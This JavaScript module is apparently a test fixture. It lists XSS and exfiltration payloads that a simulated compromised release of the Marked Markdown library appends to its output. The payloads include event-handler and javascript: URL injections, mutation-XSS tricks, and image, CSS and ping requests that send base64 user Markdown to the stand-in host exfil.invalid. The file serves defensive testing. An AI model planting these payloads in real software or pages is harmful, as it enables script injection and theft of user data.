// Payload corpus of the compromised Marked release. Each entry is HTML the
// release appends to every parse() result. Script payloads call
// window.__PWN__(id) when they run; exfiltration payloads make the page
// request http://exfil.invalid/<id>?d=<base64 of the user's Markdown>, which
// the library has read as input but, under an empty grant, cannot send itself.
// Payloads that change the parser state for what follows (raw-text
// elements) come last, noscript before math/style.
// "needs" says what triggers it: load (on insertion), focus, click.
module.exports = [
  { id: "exfil-img", kind: "exfil", needs: "load", html: `<img src="http://exfil.invalid/exfil-img?d=__DATA__" alt="">` },
  { id: "exfil-css-url", kind: "exfil", needs: "load", html: `<div style="background-image:url('http://exfil.invalid/exfil-css-url?d=__DATA__')">.</div>` },
  { id: "exfil-picture", kind: "exfil", needs: "load", html: `<picture><source srcset="http://exfil.invalid/exfil-picture?d=__DATA__"><img alt=""></picture>` },
  { id: "exfil-a-ping", kind: "exfil", needs: "click", html: `<a class="pwn-click" href="#x" ping="http://exfil.invalid/exfil-a-ping?d=__DATA__">p</a>` },
  { id: "img-onerror", kind: "script", needs: "load", html: `<img src=x onerror="__PWN__('img-onerror')">` },
  { id: "svg-onload", kind: "script", needs: "load", html: `<svg onload="__PWN__('svg-onload')"></svg>` },
  { id: "details-ontoggle", kind: "script", needs: "load", html: `<details open ontoggle="__PWN__('details-ontoggle')"><summary>s</summary></details>` },
  { id: "video-source-onerror", kind: "script", needs: "load", html: `<video><source onerror="__PWN__('video-source-onerror')"></video>` },
  { id: "style-onload", kind: "script", needs: "load", html: `<style onload="__PWN__('style-onload')"></style>` },
  { id: "input-autofocus", kind: "script", needs: "focus", html: `<input autofocus onfocus="__PWN__('input-autofocus')">` },
  { id: "iframe-srcdoc", kind: "script", needs: "load", html: `<iframe srcdoc="<script>parent.__PWN__('iframe-srcdoc')</script>"></iframe>` },
  { id: "iframe-javascript", kind: "script", needs: "load", html: `<iframe src="javascript:parent.__PWN__('iframe-javascript')"></iframe>` },
  { id: "object-javascript", kind: "script", needs: "load", html: `<object data="javascript:__PWN__('object-javascript')"></object>` },
  { id: "a-javascript", kind: "script", needs: "click", html: `<a class="pwn-click" href="javascript:__PWN__('a-javascript')">link</a>` },
  { id: "form-formaction", kind: "script", needs: "click", html: `<form><button class="pwn-click" formaction="javascript:__PWN__('form-formaction')">b</button></form>` },
  { id: "script-tag", kind: "script", needs: "load", html: `<script>__PWN__('script-tag')</script>` },
  { id: "mxss-noscript", kind: "script", needs: "load", html: `<noscript><p title="</noscript><img src=x onerror=__PWN__('mxss-noscript')>"></noscript>` },
  { id: "mxss-math-style", kind: "script", needs: "load", html: `<math><mtext><table><mglyph><style><img src=x onerror="__PWN__('mxss-math-style')">` },
];
